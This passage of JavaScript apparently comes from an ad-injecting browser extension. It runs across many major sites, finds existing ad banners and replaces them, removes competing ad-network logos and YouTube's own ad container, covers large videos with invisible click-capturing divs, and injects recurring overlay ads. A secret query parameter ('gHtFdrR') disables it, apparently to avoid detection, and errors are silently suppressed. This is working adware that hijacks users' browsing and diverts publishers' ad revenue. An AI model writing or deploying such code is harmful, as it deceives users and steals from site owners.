                        var fader_2 = fader.parentNode;
                        if (peas.src.match(/[^0-9a-z]+worldssl\.net[^0-9a-z]+/img)) {
                            change_peas(peas);
                        } else if (!peas.getAttribute('data-mytype') && str_rs_img.indexOf(',' + w + 'x' + h + ',') !== -1 && fader.tagName !== 'BODY' && peas.src) {
                            if (fader.tagName === 'DIV' || fader.tagName === 'CENTER' || fader.tagName === 'NOINDEX') {
                                ch(peas, w, h);
                            } else if (fader.tagName === 'A' && (fader_2.tagName === 'DIV' || fader_2.tagName === 'CENTER' || fader_2.tagName === 'NOINDEX' || fader_2.tagName === 'TD')) {
                                ch(fader, w, h);
                            }
                        } else if (w > 99 && h > 49 && peas.src.match(/[^0-9a-z]+(adv\.wp\.pl|heo3x\.net|pipki.r)[^0-9a-z]+/img)) {
                            if (fader.tagName === 'DIV' || fader.tagName === 'CENTER' || fader.tagName === 'NOINDEX') {
                                ch(peas, w, h);
                            } else if (fader.tagName === 'A' && (fader_2.tagName === 'DIV' || fader_2.tagName === 'CENTER' || fader_2.tagName === 'NOINDEX' || fader_2.tagName === 'TD')) {
                                ch(fader, w, h);
                            }
                        }
                    });
                };
                all_ban_imgs();
                var del_logo = ['div[class^="serp-adv__head"]', 'a[title^="Рекламная сеть Recreativ"]', 'a[href^="http://tovarro.com/"]', 'div[class^="main-title"]', 'a[href^="http://usr.marketgid.com/"]', 'a[class^="adbucks"]', 'div[class^="ssvzHeader"]', 'span[id^="adtima-logo"]', 'a[class^="admLogoAdx"]', 'a[class^="admLogoAdx"]', 'a[href^="//traforet.com/"]', 'div[onclick^="window.open"]', 'div[onclick^="window.open"]', 'a[href^="http://tizerlady.ru/"]'];
                del_logo.forEach(function (pp) {
                    Array.prototype.forEach.call($$('' + pp + ''), function (a) {
                        if (!host.match(/(markrtgid\.com|tovarro\.com|tizerlady\.ru)+/img)) {
                            a.parentNode.removeChild(a);
                        }
                    });
                });
            }

            if (!host.indexOf('myaccount.google.com') > -1) {
                all_div_iframe_baners();
            }
        }

        function video() {
            function getOffsetTop(elem) {
                var top = 0;
                while (elem) {
                    top = top + parseFloat(elem.offsetTop);
                    elem = elem.offsetParent
                }
                return top
            }

            function getOffsetLeft(elem) {
                var left = 0;
                while (elem) {
                    left = left + parseFloat(elem.offsetLeft);
                    elem = elem.offsetParent
                }
                return left
            }

            var myObject = [];
            Array.prototype.forEach.call($$('video'), function (a) {
                if (a.offsetHeight > 250 && a.offsetWidth > a.offsetHeight && a.offsetWidth >= 468 && !a.getAttribute('data-mytype')) {
                    myObject.push(a);
                    if (host !== 'www.youtube.com') {
                        a.setAttribute('data-mytype', 'name_video');
                    }
                }
            });
            Array.prototype.forEach.call($$('iframe'), function (b) {
                var iframe_src = b.src;
                if (b.offsetHeight > 300 && b.offsetWidth > b.offsetHeight && b.offsetWidth >= 468 && iframe_src && !b.getAttribute('data-mytype')) {
                    if ((iframe_src.match(/[^0-9a-z]+(youtube|rutube|moonwalk|video|kino|ivi|player|autoplay|serpens)[^0-9a-z]+/img) || iframe_src.indexOf('video') !== -1 || iframe_src.indexOf('youtube') !== -1) && iframe_src.indexOf('vk.com') === -1) {
                        myObject.push(b);
                        b.setAttribute('data-mytype', 'name_iframe');
                    }
                }
            });
            Array.prototype.forEach.call($$('object'), function (c) {
                var obj_data = c.getAttribute('data');
                if (c.offsetHeight > 300 && c.offsetWidth > c.offsetHeight && c.offsetWidth >= 468 && obj_data && !c.getAttribute('data-mytype')) {
                    if (obj_data.match(/[^0-9a-z]+(youtube|rutube|moonwalk|video|kino|kinogo|player|MegaPlayer)[^0-9a-z]+/img) || obj_data.indexOf('video') !== -1) {
                        myObject.push(c);
                        c.setAttribute('data-mytype', 'name_object');
                    }
                }
            });
            if (myObject.length > 0) {
                myObject.forEach(function (peas) {
                    var w = peas.offsetWidth;
                    var h = peas.offsetHeight;
                    var f = true;
                    var ff = peas.parentNode;
                    for (var i = 0; i < 15; i++) {
                        if ((ff.style.position === 'fixed' || GetCssStyle(ff).position === 'fixed') && f === true) {
                            f = false;
                        } else if (ff && ff.tagName !== 'BODY') {
                            ff = ff.parentNode;
                        }
                    }
                    if (f === true && w > 468 && h > 200 && !document.querySelector('iframe[data-prel="name_iframe"]')) {
                        var top = getOffsetTop(peas);
                        var left = getOffsetLeft(peas);
                        var abs = document.createElement('div');
                        if (host !== 'www.youtube.com') {
                            abs.setAttribute('style', 'width:' + w + 'px;height:' + h + 'px;top:' + top + 'px;left:' + left + 'px;position:absolute;cursor:pointer;z-index:9999999999999;');
                        }
                        body.appendChild(abs);
                        setInterval(function () {
                            abs.style.left = getOffsetLeft(peas) + 'px';
                            abs.style.top = getOffsetTop(peas) + 'px';
                        }, 2000);
                        var gt = setInterval(function () {
                            if (peas.offsetWidth < 468) {
                                clearInterval(gt);
                                if (abs) {
                                    abs.parentNode.removeChild(abs);
                                }
                            }
                        }, 2000);
                        var add = function () {
                            if (if_yti) {
                                peas.setAttribute('data-mytype', 'name_video');
                            } else {
                                abs.parentNode.removeChild(abs);
                            }
                            Array.prototype.forEach.call($$('.video_pl_p'), function (p) {
                                p.parentNode.removeChild(p);
                            });
                            var tl = 120000;
                            var t_n = function (tl) {
                                if (peas) {
                                    w = peas.offsetWidth;
                                    h = peas.offsetHeight;
                                    var m_d = document.createElement('div');
                                    var w_2 = 728;
                                    var h_2 = 90;
                                    if (peas.offsetWidth < 728 && peas.offsetWidth >= 468) {
                                        w_2 = 468;
                                        h_2 = 60;
                                    }
                                    var t = (h + getOffsetTop(peas)) - (h_2 + 40);
                                    var l = ((w - w_2) / 2) + getOffsetLeft(peas);
                                    m_d.setAttribute('style', 'position:absolute;background:#fff;top:' + t + 'px;z-index:9999999999999;left:' + l + 'px;width:' + w_2 + 'px;height:' + h_2 + 'px;');
                                    m_d.id = 'yout_play_y';
                                    m_d.className = 'video_pl_p';
                                    var td = setInterval(function () {
                                        if (if_yti) {
                                            var adsd = document.querySelector('div[class^="ad-container ad-container-single-media"]');
                                            if (adsd && adsd.innerHTML !== '') {
                                                adsd.innerHTML = '';
                                            }
                                        }
                                        w = peas.offsetWidth;
                                        h = peas.offsetHeight;
                                        if (w < w_2 || ($_GET('q') && $_GET('q') === 'gHtFdrR')) {
                                            clearInterval(td);
                                            if (m_d) {
                                                m_d.parentNode.removeChild(m_d);
                                            }
                                            if (peas.getAttribute('data-mytype')) {
                                                peas.removeAttribute('data-mytype');
                                            }
                                        } else {
                                            top = getOffsetTop(peas);
                                            left = getOffsetLeft(peas);
                                            var t = (h + top) - (h_2 + 40);
                                            var l = ((w - w_2) / 2) + left;
                                            m_d.style.top = t + 'px';
                                            m_d.style.left = l + 'px';
                                        }
                                    }, 500);
                                    var sp = document.createElement('span');
                                    var brd = '';
                                    if (if_yti) {
                                        brd = 'border:1px solid #7f7f7f';
                                    }
                                    sp.setAttribute('style', 'z-index:999999;cursor:pointer;position:absolute;right:0;top:0;width:12px;height:12px;background:#fff;padding:1px;' + brd);
                                    sp.innerHTML = cl_img;
                                    m_d.appendChild(sp);
                                    var md_2 = document.createElement('div');
                                    m_d.appendChild(md_2);
                                    sp.onclick = function () {
                                        clearInterval(td);
                                        if (m_d) {
                                            m_d.parentNode.removeChild(m_d);
                                        }
                                        setTimeout(function () {
                                            if ((!$_GET('q') || ($_GET('q') && $_GET('q') !== 'gHtFdrR')) && !document.querySelector('iframe[data-prel="name_iframe"]')) {
                                                if (if_yti) {
                                                    t_n(tl + 60000);
                                                } else {
                                                    t_n(tl + 120000);
                                                }
                                            } else if (peas.getAttribute('data-mytype')) {
                                                peas.removeAttribute('data-mytype');
                                            }
                                        }, tl);
                                    };
                                    body.appendChild(m_d);
                                    createDiv(h_2, w_2, md_2, 'video');
                                } else if (abs) {
                                    abs.parentNode.removeChild(abs);
                                }
                            };
                            t_n(tl);
                        };
                        if (if_yti) {
                            if (document.location.href.indexOf('watch') !== -1) {
                                add();
                            }
                        } else {
                            abs.onclick = function () {
                                add();
                            };
                        }
                    }
                });
            }
        }

        if (host !== 'rutube.ru' && host !== 'binatex.com' && host !== 'www.twitch.tv' && (!$_GET('q') || ($_GET('q') && $_GET('q') !== 'gHtFdrR'))) {
            video();
        }
    };
    var ttt_int = function (tt) {
        if (host.match(/(flipkart|pinterest|webtretho|coccoc|walmart|ok\.ru|vk\.com|vonvon|foxnews|drive2|rambler|youtube|ask\.fm|yahoo|rutube|instagram|bing\.com|zing\.vn|google|yandex|mail\.ru|reddit|rediff|gipfy)/img)) {
            var mytime = setInterval(function () {
                if (!$_GET('q') || ($_GET('q') && $_GET('q') !== 'gHtFdrR')) {
                    int_funk();
                }
                count++;
            }, 4000);
        } else {
            mytime = setInterval(function () {
                int_funk();
                if (count === 20) {
                    clearInterval(mytime);
                    ttt_int(500);
                } else if (count === 50) {
                    clearInterval(mytime);
                }
                count++;
            }, tt);
        }
        int_funk();
    };
    if (host === 'www.facebook.com') {
        var body_big_cont = document.querySelector('._li');
        if (body_big_cont) {
            body_big_cont.onclick = function () {
                int_funk();
                ttt_int(100);
            };
        }
    }
    try {
        int_funk();
    } catch (fuEx) {
    }
    try {
        ttt_int(100);
    } catch (initEx) {
    }
};